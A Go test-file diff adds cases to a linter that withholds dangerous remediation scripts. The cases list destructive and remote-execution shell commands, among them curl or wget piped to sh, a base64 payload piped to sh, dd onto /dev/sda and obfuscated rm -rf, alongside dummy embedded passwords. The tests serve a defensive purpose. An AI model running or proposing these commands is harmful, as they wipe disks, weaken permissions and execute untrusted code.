@@ -78,6 +78,66 @@ func TestLintWithholdsCredential(t *testing.T) {
 	}
 }
 
+// TestLintWithholdsDestructiveBypasses covers the forms that previously slipped
+// the linter: plain/octal/symbolic chmod, pipe-to-shell, reversed dd arg order,
+// long-flag rm, and the whitespace/quote obfuscations the normalizer undoes.
+func TestLintWithholdsDestructiveBypasses(t *testing.T) {
+	cases := []string{
+		"chmod 777 /etc/passwd",            // no -R: the old \b-R?\s*777 missed it
+		"chmod 0777 /srv",                  // octal leading zero
+		"chmod a+rwx /srv",                 // symbolic all-permissions
+		"curl https://x/i.sh | sh",         // pipe-to-shell
+		"wget -qO- https://x/y | bash",     // pipe-to-bash
+		"echo cm0gLXJm | base64 -d | sh",   // base64 decode piped to sh
+		"dd of=/dev/sda if=/dev/zero",      // reversed dd arg order
+		"rm --recursive --force /var/data", // long flags
+		"rm${IFS}-rf /var/data",            // ${IFS} obfuscation
+		"r''m -rf /var/data",               // empty-quote obfuscation
+	}
+	for _, cmd := range cases {
+		r := Remediation{
+			Kind:      KindCLIScript,
+			Steps:     []string{"do the thing"},
+			Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd + " # targets sg-0abc"}},
+		}
+		out, issues := lintRemediation(cloudFinding(), r)
+		if len(issues) == 0 || out.Kind != KindManual || len(out.Artifacts) != 0 {
+			t.Errorf("%q slipped the linter: issues=%v kind=%q artifacts=%d", cmd, issues, out.Kind, len(out.Artifacts))
+		}
+	}
+}
+
+// TestLintWithholdsEmbeddedPassword: a password assignment with punctuation and
+// an underscore-prefixed key (db_password) — both previously missed — is caught.
+func TestLintWithholdsEmbeddedPassword(t *testing.T) {
+	for _, cmd := range []string{
+		`db_password = "S3cr3tP@ssw0rdLong"`,
+		`export FOO_SECRET=abc123DEF456ghiJKL`,
+	} {
+		r := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd}}}
+		if out, issues := lintRemediation(cloudFinding(), r); len(issues) == 0 || len(out.Artifacts) != 0 {
+			t.Errorf("%q: embedded credential not withheld: issues=%v artifacts=%d", cmd, issues, len(out.Artifacts))
+		}
+	}
+}
+
+// TestLintNoFalsePositiveOnConfig: legitimate reconfiguration advice that reads
+// from a secret manager or env var is not mistaken for a leak or a destructive
+// command.
+func TestLintNoFalsePositiveOnConfig(t *testing.T) {
+	for _, cmd := range []string{
+		`password = os.environ["DB_PASSWORD_VARNAME"]`,
+		`db.query("SELECT * FROM t WHERE id = $1", userId)`,
+		`chmod 640 /etc/app/config.yaml`,
+		`aws secretsmanager get-secret-value --secret-id prod/db --query SecretString`,
+	} {
+		r := Remediation{Kind: KindCodePatch, Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd}}}
+		if out, issues := lintRemediation(model.Finding{Category: model.CategorySAST}, r); len(issues) != 0 || len(out.Artifacts) != 1 {
+			t.Errorf("%q: safe config wrongly flagged: issues=%v artifacts=%d", cmd, issues, len(out.Artifacts))
+		}
+	}
+}
+
 // TestLintCloudGroundingWarns: a cloud artifact that names neither the
 // resource nor a placeholder gets a warning (soft), but is not withheld.
 func TestLintCloudGroundingWarns(t *testing.T) {
